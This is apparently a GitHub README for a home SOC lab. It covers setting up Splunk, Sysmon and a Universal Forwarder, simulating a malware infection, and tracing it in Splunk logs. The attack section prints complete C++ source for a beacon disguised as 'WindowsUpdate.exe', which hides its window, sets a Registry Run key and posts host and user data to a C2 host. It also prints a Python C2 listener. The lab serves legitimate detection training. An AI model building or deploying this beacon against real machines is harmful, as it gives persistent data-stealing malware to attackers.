<p align="center">
  <img width="600" height="auto" alt="la ilaha illallah muhammadur rasul ullah" src="https://github.com/user-attachments/assets/ea535413-9326-46a8-82b1-4adc81d28cfd" />
</p>

<p align="center">
  I Keep Six Honest Serving Men. They Taught Me All I Know Their Names Are "What, Why, When, Where, Who, And How"</br>
  <i>Rudyard Kipling</i>
</p>

<p align="center">
  <a href="https://linkedin.com/in/gl1t0h">LinkedIn</a> •
  <a href="https://github.com/GL1T0H">GitHub</a> •
  <a href="https://x.com/GL1T0H">X</a> •
  <a href="https://g1it0h.gitbook.io/glitch">Blog</a>
</p>

<h6 align="center">This project is currently under active development 🚧</h6>

---



# Introduction
This documentation provides detailed guidance step by step through building your SOC lab from scratch — from setting up the infra, to designing and running attack scenarios, and finally learning how to detect and analyze them using Splunk and more.

## Table of Contents

- [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)

- [Project Overview](#project-overview)
  - [What is Red2Blue?](#what-is-red2blue)
  - [What You Will Learn](#what-you-will-learn)
  - [Lab Architecture](#lab-architecture)
  - [Lab Requirements](#lab-requirements)

- [Infrastructure](#infrastructure)
  - [Infrastructure Diagram (Architecture Schema)](#infrastructure-diagram-architecture-schema)
  - [SIEM Server (Windows 10 Host)](#siem-server-windows-10-host)
    - [Splunk Enterprise Setup & Installation](#splunk-enterprise-setup--installation)
    - [Initial Splunk Configuration](#initial-splunk-configuration)
    - [Add-ons & Apps Configuration](#add-ons--apps-configuration)
  - [Endpoint (Windows 10 VM)](#endpoint-windows-10-vm)
    - [Setting Up Windows 10 on VMware](#setting-up-windows-10-on-vmware)
    - [Sysmon Installation & Configuration](#sysmon-installation--configuration)
    - [Splunk Universal Forwarder Setup & Installation](#splunk-universal-forwarder-setup--installation)
    - [Splunk Universal Forwarder Configuration](#splunk-universal-forwarder-configuration)
  - [Testing & Log Verification](#testing--log-verification) <----

- [Use Cases](#Use-Cases)
  - [Use Case 1: The Basic Beacon (Script-Kiddie)](#Use-Case-1:-The-Basic-Beacon-(Script-Kiddie))
    - [Overview](#overview)
    - [Attack Flow](#attack-flow)
    - [MITRE ATT&CK Mapping](#mitre-attck-mapping)
    - [Environment & Malware Setup](#Environment-&-Malware-Setup)
      - [Malware Source Code (C++)](#Malware-Source-Code-(C++))
      - [Set Up the C2 Server on Kali Linux (Python)](#Set-Up-the-C2-Server-on-Kali-Linux-(Python))

- [Detection & Analysis](#detection--analysis)
  - [Context Concepts](#context-concepts)
  - [Alerts and Detection](#alerts-and-detection)
  - [Use Case 1: The Basic Beacon (Script-Kiddie)](#The-Basic-Beacon-(Script-Kiddie))
  - [Use Case 2: Phishing via Malicious Word Attachment](###Use-Case-2:-Phishing-via-Malicious-Word-Attachment)

# Project Overview

## What is Red2Blue?
**Red2Blue** is a hands-on home SOC lab designed to demonstrate how common attack techniques generate logs and telemetry, and how defenders can detect, investigate, and respond to these attacks using **Splunk**.

This project bridges the gap between **Red Team attack simulation** and **Blue Team detection engineering**, focusing on attacker behavior rather than tools.

## What You Will Learn
By working through this lab, you will learn how to:
- Build a complete SOC lab at home using Splunk
- Simulate realistic attack scenarios in a controlled environment
- Analyze attacker-generated telemetry
- Write effective SPL-based detections
- Think like a SOC analyst and detection engineer

## Lab Architecture
Before we dive into the technical steps, let’s quickly understand the architecture:
- Windows 10 Host (Soc analyst)
  - Runs Splunk Enterprise
  - Acts as the SIEM server
- Windows 10 Virtual Machine (Endpoint)
  - Runs Splunk Universal Forwarder
  - Generates logs (Windows Events + Sysmon)
- Communication
  - Logs are sent from the VM to the host via TCP Port (e.g., 9997)

<img width="1536" height="1024" alt="ChatGPT Image Feb 4, 2026, 12_01_00 AM" src="https://github.com/user-attachments/assets/440b54e4-a3ba-460f-8b35-79f5a5532cdb" />

## Lab Requirements
### Hardware
- Minimum 16 GB RAM (8 GB possible with limitations)
- 100+ GB available disk space
- CPU with virtualization support enabled

## Host Operating System
- Windows 10 or 11

## Virtualization
- VMware Workstation (recommended)
- VirtualBox (alternative)

## Software
- Splunk Enterprise
- Splunk Universal Forwarder
- Windows 10 ISO
- Sysmon
- Some plugs in splunk Enterprise

---

# Infrastructure

## Infrastructure Diagram (Architecture Schema)

#### The infrastructure diagram illustrates a simple SOC lab architecture where a Windows 10 endpoint generates security telemetry using Sysmon and Windows Event Logs. This telemetry is collected and forwarded by the Splunk Universal Forwarder to a centralized Splunk Enterprise SIEM server over TCP port 9997. The SIEM server indexes, stores, and analyzes the incoming logs, enabling detection and alerting use cases.

<img width="1536" height="1024" alt="ChatGPT Image Feb 4, 2026, 12_01_00 AM" src="https://github.com/user-attachments/assets/440b54e4-a3ba-460f-8b35-79f5a5532cdb" />

## SIEM Server (Windows 10 Host)

### Splunk Enterprise Setup & Installation
First, in our **Windows 10 (HOST)** navigate to splunk.com and create a free account if you haven’t already And download the latest version of Splunk Enterprise
([https://www.splunk.com/en_us/download.html](https://www.splunk.com/en_us/download.html))

<p align="left">
  <img width="40%" alt="Screenshot_1" src="https://github.com/user-attachments/assets/946943b0-35c6-453e-a38a-c1c6068afdc9" />
  <img width="40%" alt="Screenshot_2" src="https://github.com/user-attachments/assets/24ef079d-6e64-4543-9550-fb4a201d4321" />
</p>

After downloading the .MSI, we are going to setup it. The process is simple, just a three click step.
1. Accept license agreement., and click next

<img alt="Screenshot_3" src="https://github.com/user-attachments/assets/b74c62ee-26d8-4592-aa53-6d3f03a4e9ff" />

2. In the next step, we are going to setup the username and password that will be required to access the web GUI of Splunk

<img alt="Screenshot_4" src="https://github.com/user-attachments/assets/234a583e-8eda-4a8a-b02d-990020dfee6b" />

3. Hit the Install Button, And Finish

<p align="left">
  <img width="40%" alt="Screenshot_5" src="https://github.com/user-attachments/assets/cd8076a9-41a2-4e16-960a-781ed22c367b" />
  <img width="40%" alt="Screenshot_6" src="https://github.com/user-attachments/assets/879f6a6d-c608-45ec-9dee-bc5e85cffcc5" />
</p>

After The installation process Finish, Splunk GUI will open in the browser.
Here’s the SPLUNK login page and we will require the credentials that was setup during installation process:

<img width="1400" height="611" alt="Screenshot_7" src="https://github.com/user-attachments/assets/538fd714-a483-4219-9bf9-fe241cbe9653" />

At this point, Splunk Enterprise is installed but not yet configured to receive logs.

### Initial Splunk Configuration
Splunk Enterprise is managed through its web interface, called Splunk Web.
1. Open your browser and navigate to: http://localhost:8000
2. Log in using the credentials you created during installation.

<img width="1365" height="623" alt="Screenshot_8" src="https://github.com/user-attachments/assets/ca0dd4a1-4db2-4e6b-843a-08ddad5854e5" />

#### Configure Receiving Port
To allow log ingestion from forwarders:
1. Go to -> Settings -> Forwarding and Receiving

<img width="1363" height="615" alt="Screenshot_9" src="https://github.com/user-attachments/assets/c0d48916-a038-48ad-aa10-973ad4aeafe6" />

Set port 9997 as the listening port for incoming logs.

<img width="1365" height="621" alt="Screenshot_10" src="https://github.com/user-attachments/assets/3a17531a-d11d-456f-98df-04eebe1e213b" />
<img width="1365" height="629" alt="Screenshot_11" src="https://github.com/user-attachments/assets/975a5346-6c81-4032-9c51-f2597248ea51" />


#### Configure Indexes
In Splunk, indexes are storage locations where incoming data is organized and kept for searching and analysis. They help Splunk quickly retrieve and manage large volumes of log or event data efficiently.W
We will Configure 4 indexes
- windows_system
- windows_security
- windows_application
- sysmon
I will explain how to do it once and you can do the same for the 4 indexes
1. Go to -> Settings -> Indexes

<img width="1361" height="616" alt="Screenshot_15" src="https://github.com/user-attachments/assets/56b0981b-5e4e-45f3-9a17-cd8215a8d3e5" />

2. From The Indexes window click **New Index**

<img width="1363" height="620" alt="Screenshot_16" src="https://github.com/user-attachments/assets/b3c5c9ea-9784-4455-a6fc-4bfe8ae1fc74" />

3. From The new Window type the index name (i.s sysmon) and keep everything in default and hit **Save**

<img width="1052" height="597" alt="Screenshot_17" src="https://github.com/user-attachments/assets/6db9fae2-c3a6-462a-a424-8e8e0c0ba8f9" />

Do the same with the 3 left indexes
> [!NOTE]
> Tall now the indexes will not work until we configure it on splunk UF so do it and keep going with me

#### Configure Windows Firewall
Make sure the port is accessible:
1. Open Windows Defender Firewall
Click on Inbound Rules -> New Rule -> Port and hit next

<img width="1213" height="728" alt="Screenshot_12" src="https://github.com/user-attachments/assets/37eb8791-8cf9-496f-a9bf-cffa9389f9fa" />

choose TCP and The Port we sit in splunk (9997)

<img width="750" height="610" alt="Screenshot_13" src="https://github.com/user-attachments/assets/f5045738-53bf-4bac-97cc-170c96c4a01f" />

Next -> "Allow The Connection" -> Next -> Next -> Pick a Name Like ("Splunk Port") And Hit Finish

<img width="1025" height="349" alt="Screenshot_14" src="https://github.com/user-attachments/assets/f31c9d6b-2021-4edf-a228-e61dfafa92c6" />

### Add-ons & Apps Configuration
A Splunk Add-on is a package that allows Splunk to collect, parse, and normalize data from a specific source. It extends Splunk’s capabilities without adding dashboards or visualizations.
We will use Microsoft Sysmon Add-on & Splunk Add-on for Microsoft Windows

lets start with **Microsoft Sysmon Add-on** To install it go to https://splunkbase.splunk.com/app/5709
Login and hit download

<img width="1344" height="619" alt="Screenshot_18" src="https://github.com/user-attachments/assets/2d98140d-9ff5-4b33-99f9-d0c409c7e0c5" />

You will find the .gtz file in downloads folder

<img width="882" height="124" alt="Screenshot_19" src="https://github.com/user-attachments/assets/52e0e804-7923-484f-ad30-a7eb46d47b08" />

Now back to splunk GUI, From home click on Apps And Manage Apps

<img width="1356" height="622" alt="Screenshot_20" src="https://github.com/user-attachments/assets/3ab15148-a481-4bdc-8432-c312eebc5201" />

From Apps Window Click on **Install App From File**

<img width="1364" height="625" alt="Screenshot_21" src="https://github.com/user-attachments/assets/132781cc-8bec-41d6-b5b3-614d12294580" />

Drag And Drop the .gtz File or Just Select It and click **Upload**

<img width="1360" height="627" alt="Screenshot_22" src="https://github.com/user-attachments/assets/6ca28f73-be95-4420-a401-aae764654b7d" />

After That you need to restart Splunk Like That `Splunk.exe restart`

<img width="953" height="491" alt="Screenshot_23" src="https://github.com/user-attachments/assets/be5ce9fd-2ebf-4641-a779-a956e71b427d" />

After Restart Back to **Apps** Window search by sysmon and you will find it like that

<img width="1359" height="483" alt="Screenshot_24" src="https://github.com/user-attachments/assets/7ee38f5e-f1c7-4a27-8a28-e0356b65b150" />

You can do the Same With **Splunk Add-on for Microsoft Windows**

---

## Endpoint (Windows 10 VM)

### Setting Up Windows 10 on VMware
In this section, we will not dive deeply into the Windows 10 installation process on VMware.  
To keep the article concise and focused, we will skip the step-by-step installation details.  
Instead, you can see this video tutorial: https://www.youtube.com/watch?v=C-avnck74gs.  
If you are not familiar with installing Windows 10 on VMware, this video will guide you through the process.

> [!NOTE]
> Make two network adapters one **Host-Only** and one **NAT**

Once the Windows 10 VM is installed normally and running, we will move on to the next step.

### Sysmon Installation & Configuration
Sysmon (System Monitor) is a Windows system service that provides detailed visibility into what is happening on an endpoint.  
It helps us track important activities like process creation, network connections, file creation, and registry changes.

In short, Sysmon gives us high-quality logs that are very useful for detection and analysis inside Splunk.

#### Download Sysmon
First, download Sysmon from the official Microsoft Sysinternals website on the endpoint (Win 10 VM)\
(https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

<img width="1362" height="692" alt="Screenshot_25" src="https://github.com/user-attachments/assets/6ef76c8f-a1bd-48f9-b96d-cee29f00f854" />

Copy The .ZIP File to **C** directory and extracting the files

<img width="1089" height="281" alt="Screenshot_26" src="https://github.com/user-attachments/assets/1ae9b15d-ecde-4b8a-b38a-b48f20a381c8" />

#### Download Sysmon Configuration (SwiftOnSecurity)
By default, Sysmon does not log much unless it is configured properly.  
To solve this, we will use the popular Sysmon configuration created by **SwiftOnSecurity**,.  
which provides a good balance between visibility and noise.

Download the configuration file and save it in the C partition ( C:\sysmon\ ) [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml)

<img width="1363" height="624" alt="Screenshot_28" src="https://github.com/user-attachments/assets/9dce296e-e9ab-4c67-8cf6-496ef301d51d" />

After That, Open **Command Prompt as Administrator**, then run the following command: `Sysmon64.exe -i sysmonconfig.xml`
This command installs Sysmon and applies the configuration at the same time.

<img width="977" height="509" alt="Screenshot_27" src="https://github.com/user-attachments/assets/e56a4341-6e48-46a6-9ecb-041c2606af96" />

#### Verification & Testing
To confirm that Sysmon is working correctly:
- From The previous cmd type: `calc.exe` 
- Open **Event Viewer**
- Navigate to: Applications and Services Logs → Microsoft → Windows → Sysmon → Operational.  
Now check that events are being generated (such as process creation for the **calc.exe**)

<img width="1365" height="718" alt="Screenshot_29" src="https://github.com/user-attachments/assets/8ed2ad6d-0aa1-406f-b4dc-c35dd648ae0f" />

Once Sysmon events are visible, we are ready to move forward and start forwarding these logs to Splunk.

### Splunk Universal Forwarder Setup & Installation

#### What is Splunk Universal Forwarder?

Splunk Universal Forwarder (UF) is a lightweight agent installed on endpoints to collect and forward logs to a Splunk instance.

It does not index or search data by itself.  
Its only job is to collect logs from the system and send them securely to the SIEM server (Splunk Enterprise).

In our lab, the Universal Forwarder will be installed on the Windows 10 VM and will forward to the Splunk Enterprise running on the host machine:
- Windows Event Logs
- Sysmon logs

#### Download Splunk Universal Forwarder

Download the Splunk Universal Forwarder from the official Splunk website. (https://www.splunk.com/en_us/download/universal-forwarder.html)

<img width="956" height="459" alt="Screenshot_30" src="https://github.com/user-attachments/assets/e85a59db-c670-45f1-adc2-79f03148238e" />

Once downloaded, move the installer to the Windows 10 VM.

<img width="1365" height="735" alt="Screenshot_31" src="https://github.com/user-attachments/assets/cf0be003-b72d-47f7-8d34-9d2177eedc50" />

#### Setup & Installation
Run the Universal Forwarder installer as a Administrator.

- Accept the license agreement

<img width="515" height="397" alt="Screenshot_32" src="https://github.com/user-attachments/assets/01d36488-097e-49b7-a3f9-1da5f723246c" />

- As we aren’t using any SSL certificate, so we will skip that:
> Since this lab does not use SSL certificates, we can safely skip this step to keep the setup simple.

<img width="530" height="409" alt="Screenshot_33" src="https://github.com/user-attachments/assets/a1c68d9a-8d12-4958-adac-0adbd65d05c0" />

- Choose **Local System** as the service account
> Using the Local System account allows the Universal Forwarder to access Windows Event Logs and other system-level resources without additional configuration.

<img width="549" height="424" alt="Screenshot_34" src="https://github.com/user-attachments/assets/9c60032b-de72-4905-aa9d-0961b402400c" />

- Select what you need to be send to splunk EP
> At this stage, you choose which logs and data sources will be forwarded from the endpoint to the SIEM server.
> This typically includes Windows Event Logs, and Sysmon logs will be configured in more detail later.

<img width="534" height="414" alt="Screenshot_35" src="https://github.com/user-attachments/assets/359ef20e-fcaf-4882-beb0-2519a7d23bee" />

- Create a username & password and note it down
> m4 m7taga 4ar7 yasta

<img width="552" height="417" alt="Screenshot_36" src="https://github.com/user-attachments/assets/c83b0310-36e5-4c7d-90e0-cb3ffd112f44" />

- Enter the IP address of your Splunk Enterprise server (Windows 10 Host)
> This allows the Universal Forwarder to know where to send the collected logs.

<p align="left">
  <img width="40%" height="401" alt="Screenshot_37" src="https://github.com/user-attachments/assets/1d0b0553-1643-491d-9402-460d886ca8e2" />
  <img width="40%" height="401" alt="Screenshot_38" src="https://github.com/user-attachments/assets/72a1e8c2-7ca4-4d61-9fef-5bbba6893703" />
</p>

- Hit Next it will take around 2 to 3 minutes to finish the installation.

<img width="548" height="428" alt="Screenshot_39" src="https://github.com/user-attachments/assets/2f66a8f1-b0f8-4d2e-a5bd-05fd56f29e41" />

After the installation is completed, the Universal Forwarder service should start automatically.  
Try This: `sc query SplunkForwarder` You should see STATE: 4 RUNNING. Like That

<img width="1024" height="567" alt="Screenshot_40" src="https://github.com/user-attachments/assets/1b95de11-af65-4b69-9bcc-c5953f83764c" />

Here’s the host name of my machine, that will be used in next steps in the confirmation of successful log ingestion:

<img width="1365" height="594" alt="Screenshot_41" src="https://github.com/user-attachments/assets/3c419c59-d24c-4d5c-a794-a8e013232904" />

Now, we will verify that logs receiving in the SPLUNK or not. Go to the **Search** tab:

<img width="1363" height="621" alt="Screenshot_42" src="https://github.com/user-attachments/assets/dde9a611-bc6c-4717-9f6a-0996f4a03ae7" />

Upon clicking the “Data Summary” button, a new pop-up window will appear and we will be able to see our Windows machine hostname, as well as the source types/log types that we selected during the installation process:

<img width="795" height="286" alt="Screenshot_43" src="https://github.com/user-attachments/assets/058fad44-a669-4944-b85a-13a32f18f1ee" />

Okay Lets Go through the Configuration part

### Splunk Universal Forwarder Configuration

At this stage, we define exactly which logs we want to collect from the endpoint and forward to Splunk Enterprise.

| File Path                                             | Purpose                                                               |
| ----------------------------------------------------- | --------------------------------------------------------------------- |
| `etc\apps\SplunkUniversalForwarder\local\inputs.conf` | Controls **how logs are collected from Windows**                      |
| `etc\system\local\inputs.conf`                        | Controls **where logs are stored and how they are labeled in Splunk** |


#### Configuration C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf
Navigate to the following directory on the Windows 10 VM: `C:\Program Files\SplunkUniversalForwarder\etc\system\local`.  
If the `inputs.conf` file does not exist, create it manually.

This configuration specifies:
- The hostname that appears inside Splunk
- Which Windows logs to collect
- Which index each log type is sent to
- Which sourcetype is applied

<img width="1207" height="626" alt="Screenshot_44" src="https://github.com/user-attachments/assets/ecec8547-9327-4428-b58b-6172143c75dd" />

After Creating the File set this Configuration
```ini
[default]
host = Endpoint-1

[WinEventLog://Security]
disabled = false
index = windows_security

[WinEventLog://System]
disabled = false
index = windows_system

[WinEventLog://Application]
disabled = false
index = windows_application

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
index = sysmon
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
```

<img width="1154" height="548" alt="Screenshot_45" src="https://github.com/user-attachments/assets/b01f542e-8b11-4033-8382-2d9c7d3c1da3" />


#### Configuration C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf
Navigate to the following directory on the Windows 10 VM: `C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\`.  
If the `inputs.conf` file does not exist, create it manually.

This configuration specifies:
- How logs are read from Windows
- From which point logs are collected
- Collection behavior (checkpoint, history, real-time)
  
<img width="1176" height="630" alt="Screenshot_47" src="https://github.com/user-attachments/assets/2902ba7d-b0d7-4125-b3fe-efbe3322d5b1" />

set this Configuration

```ini
[WinEventLog://Application]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest

[WinEventLog://Security]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest

[WinEventLog://System]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest
```

<img width="1193" height="587" alt="Screenshot_48" src="https://github.com/user-attachments/assets/d98b5151-cd3d-4fbb-aaa7-870095c6beb8" />


After saving the files, restart the Splunk Universal Forwarder service to apply the changes\
Once restarted, the endpoint will begin sending logs to Splunk Enterprise based on this configuration.

<img width="1003" height="529" alt="Screenshot_46" src="https://github.com/user-attachments/assets/bdb4bf33-401a-4c36-bce9-97ae187941b2" />

## Testing & Log Verification
Now let's validate that logs are being correctly generated, forwarded, and indexed in Splunk
1. Make sure the Splunk Universal Forwarder service is running -> `sc query splunkforwarder`

<img width="623" height="196" alt="Screenshot_49" src="https://github.com/user-attachments/assets/3eb61749-ffd7-4c8d-b96f-f9d3942f78d8" />

2. To confirm log collection, generate some test events on the endpoint:
<img width="981" height="404" alt="Screenshot_50" src="https://github.com/user-attachments/assets/c7eb0ab2-617a-4296-bafe-c74065883f23" />

3. Back to splunk and in search box type `index=* host="Endpoint-1"`.  
U will see that sysmon log source gen 3 logs:
  - 1 Dns Query
  - 2 Process Create

<img width="1363" height="651" alt="Screenshot_51" src="https://github.com/user-attachments/assets/32ac88e9-9b83-4097-b50c-c2e0d4c0e757" />

---

# Use Cases
In this section, we will start building realistic attack scenarios to better understand how attacks happen in real environments.  
The main goal is not exploitation itself, but learning how attackers think and operate, even at a basic level.  

By simulating these scenarios, we will generate real logs and events inside our environment.  
These logs will help us understand how attacks look from a defensive POV, how they appear in the SIEM, and how we can detect, investigate, and confirm if such activity happened in our environment.  

Each attack scenario will later be mapped to MITRE ATT&CK and used to build detection use cases and alerts.  

## Use Case 1: The Basic Beacon (Script-Kiddie)

### Scenario Overview

In this scenario, we simulate a common entry-level malware infection. The attacker delivers a standalone executable (`WindowsUpdate.exe`) that, once executed, ensures its survival across system reboots and establishes a persistent communication channel with a Command and Control (C2) server to exfiltrate basic host information.

---

### Attack Flow

1. **Initial Access:** The user manually executes the malicious binary.
2. **Evasion:** The malware immediately hides its console window to run silently in the background.
3. **Persistence:** The malware modifies the Windows Registry `Run` key to ensure it starts automatically every time the user logs in.
4. **Discovery:** It queries the OS for the computer name, current username, and OS version.
5. **C2 & Exfiltration:** It initiates a periodic "Beaconing" process every 30 seconds, sending the gathered data via HTTP POST requests to the attacker's server.

---

### MITRE ATT&CK Mapping

| Stage | Action | MITRE ATT&CK ID | Artifacts / Logs |
| --- | --- | --- | --- |
| **Initial Execution** | User runs the `.exe` manually. | **User Execution (T1204.002)** | Sysmon Event ID 1 (Process Creation) |
| **Persistence** | Adds binary path to `HKCU\..\Run` key. | **Boot or Logon Autostart (T1547.001)** | Sysmon Event ID 13 (Registry Value Set) |
| **Discovery** | Collects Hostname, Username, and OS info. | **System Information Discovery (T1082)** | API Monitoring / EDR Telemetry |
| **C2 Channel** | Establishes HTTP communication (Port 8080). | **Application Layer Protocol (T1071.001)** | Sysmon Event ID 3 (Network Connection) |
| **Exfiltration** | Sends system info within the HTTP Body. | **Exfiltration Over C2 Channel (T1041)** | Network Traffic / PCAP Analysis |

---

### Environment & Malware Setup

#### Malware Source Code (C++)

> **Note:** This code is compiled for Scenario 1. It focuses on basic persistence and clear beaconing patterns.

```cpp
#include <iostream>
#include <string>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

using namespace std;

// C2 Server Configuration
string C2_IP = "YOUR_C2_IP_ADDRESS"; // I AM USING KALI LINUX
int C2_PORT = 8080;

// [T1547.001] Persistence: Writing to Registry Run Key
void EstablishPersistence() {
    char path[MAX_PATH];
    // Get the full path of the current running executable
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hKey;
    // Open the Registry Key for the current user's auto-run programs
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Create a new value "WindowsDiagnostic" pointing to our malware path
        RegSetValueExA(hKey, "WindowsDiagnostic", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

// [T1082] Discovery: Gathering Host Information
string GatherSystemInfo() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    string info = "";

    // Retrieve the computer name
    if (GetComputerNameA(buffer, &size)) {
        info += "Hostname: " + string(buffer) + " | ";
    }

    // Retrieve the current active username
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        info += "User: " + string(buffer) + " | ";
    }

    return info;
}

// [T1071.001] C2 Communication: Sending Data via HTTP POST
void SendDataToC2(string data) {
    // Initialize the Windows Internet (WinINet) session
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession) {
        // Connect to the C2 server IP and Port
        HINTERNET hConnect = InternetConnectA(hSession, C2_IP.c_str(), C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            // Prepare an HTTP POST request to the /update endpoint
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/update", NULL, NULL, NULL, 0, 0);
            if (hRequest) {
                // Send the collected system info in the request body
                HttpSendRequestA(hRequest, NULL, 0, (LPVOID)data.c_str(), data.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

int main() {
    // [Evasion] Stealth: Hide the console window immediately upon execution
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    // Run persistence once
    EstablishPersistence();

    // Main Beaconing Loop
    while (true) {
        string systemInfo = GatherSystemInfo();
        SendDataToC2(systemInfo);
        
        // Wait for 30 seconds before the next check-in (Beacon)
        Sleep(30000); 
    }
    return 0;
}

```
After Put it in The Enpoint (VM)
<img width="1134" height="591" alt="Screenshot_55" src="https://github.com/user-attachments/assets/0003883c-77aa-4980-9afd-e9226d7e3479" />

---

#### C2 Server Setup (Python)

> **Standard Listener:** This Python script acts as our centralized Command & Control server. It will be used consistently across Scenarios 1, 2, and 3 to log incoming exfiltrated data into a local text file.

```python
# Save this as C2.py on your Attacker Machine
# Usage: python3 C2.py

import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime

LOG_FILE = "C2_Exfiltrated_Data.txt"

class MegaC2Handler(BaseHTTPRequestHandler):
    
    def log_to_file(self, client_ip, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"--- New Beacon ---\n")
            f.write(f"Time: {timestamp}\n")
            f.write(f"From: {client_ip}\n")
            f.write(f"Data: {data}\n")
            f.write("-" * 20 + "\n")

    def do_POST(self):
       
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        client_ip = self.client_address[0]
        
        print(f"\n\033[92m[+] Received Beacon from {client_ip}\033[0m")
        print(f"\033[94m[!] Data: {post_data}\033[0m")
        
        self.log_to_file(client_ip, post_data)
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return

def run_server():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, MegaC2Handler)
    print("\033[91m" + "="*40 + "\033[0m")
    print("\033[1m  RED2BLUE - C2 LISTENER STARTED  \033[0m")
    print(f"\033[93m Listening on port 8080... \033[0m")
    print(f"\033[93m Logs will be saved to: {LOG_FILE} \033[0m")
    print("\033[91m" + "="*40 + "\033[0m")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server Stopping...")
        httpd.server_close()

if __name__ == "__main__":
    run_server()

```
That When The Malware Executed
<img width="1283" height="555" alt="Screenshot_60" src="https://github.com/user-attachments/assets/f98f03a8-cb67-4233-b549-1cd10aa9b71b" />


---

# Detection & Analysis

## Context Concepts
blblblbllblblbllblblblbllblblbllblblblbllblblbllblblblbllblblbll

## Alerts and Detection
blblblbllblblbllblblblbllblblbllblblblbllblblbllblblblbllblblbll

## Use Case 1: The Basic Beacon (Script-Kiddie)
In this scenario, we simulate a common entry-level malware infection. The attacker delivers a standalone executable (`WindowsUpdate.exe`) that, once executed, ensures its survival across system reboots and establishes a persistent communication channel with a Command and Control (C2) server to exfiltrate basic host information.

### Log Analysis
Now that the scenario has been executed, we move to Splunk to analyze the logs generated by the attack.

The goal here is to:
- Understand how the attack looks from a defensive perspective
- Follow the attack timeline step by step
- Identify key artifacts and behaviors
- Extract useful Indicators of Compromise (IOCs)

> ⚠️ This is a very basic scenario, and everything is intentionally clear and straightforward. Later scenarios will be more complex and realistic

#### Starting Point: Raw Log Visibility
We begin with a broad query to gain full visibility over the endpoint activity:
`index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*"`
Why this matters:
We start wide to avoid missing anything important
Filtering by host isolates the victim machine
Excluding Splunk-related processes reduces noise and improves clarity

At this stage, we are not hunting yet — we are simply observing what happened.
<img width="1354" height="369" alt="image" src="https://github.com/user-attachments/assets/a06b96b5-160c-4a09-9724-84ca51cb5b9a" />

#### File Drop Evidence
After transferring the malware (WindowsUpdate.exe) into the system (via Copy/Paste or Drag & Drop), we observe the following:

EventCode = 11 → File Created
EventCode = 2 → File Time Modified
<img width="1114" height="282" alt="Screenshot_62" src="https://github.com/user-attachments/assets/2b89f407-8213-4bf5-a7a6-4870bb2b1b1e" />
Analysis:
These events confirm that a new file was introduced into the system.
- Event 11: gives us the exact file path and creation details
- Event  2: indicates timestamp modification, which naturally occurs during file transfers

While these events are normal, they become important when correlated with suspicious filenames or locations.
<img width="1112" height="468" alt="Screenshot_63" src="https://github.com/user-attachments/assets/7781a15e-5ad4-4e8d-9415-d2ede4dc3748" />


#### Payload Tracking & Pivoting
To move from general observation to focused investigation, we pivot using the malware name:
`index=* host="DESKTOP-MOPLS2N" "WindowsUpdate.exe"`
Why pivoting is important:
- It isolates all activity related to the payload
- Helps build a clean timeline of attacker actions
- Reduces noise significantly

From this point forward, every event we analyze is directly tied to the malware.
<img width="1357" height="620" alt="Screenshot_64" src="https://github.com/user-attachments/assets/a623dbd3-62e7-4d37-9227-f0e93cf6e2e7" />


#### Initial Execution (EventCode 1)
This event confirms that the malware was executed.

**Maps to: User Execution (T1204.002)**
Key insights:
The presence of WindowsUpdate.exe as a running process confirms execution
Parent process data helps identify how it was launched
Command-line arguments may reveal additional behavior

This is the exact moment where the attack becomes active.
<img width="1138" height="598" alt="Screenshot_65" src="https://github.com/user-attachments/assets/656688af-560e-45e0-bbd7-d7658bb4ade1" />

And From The Victim Side U can see the process in the taskmanger
<img width="658" height="261" alt="Screenshot_61" src="https://github.com/user-attachments/assets/1c340fac-c001-4e74-b8dc-06ddc2297a75" />


#### Persistence Mechanism (EventCode 13)
This event indicates that the malware modified the Windows Registry.

Maps to: Boot or Logon Autostart Execution (T1547.001)
What happened:
**The malware added itself to the following key:**
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

Why this is critical:
- Ensures the malware runs automatically on every login
- Survives system reboots
- Common technique used by attackers
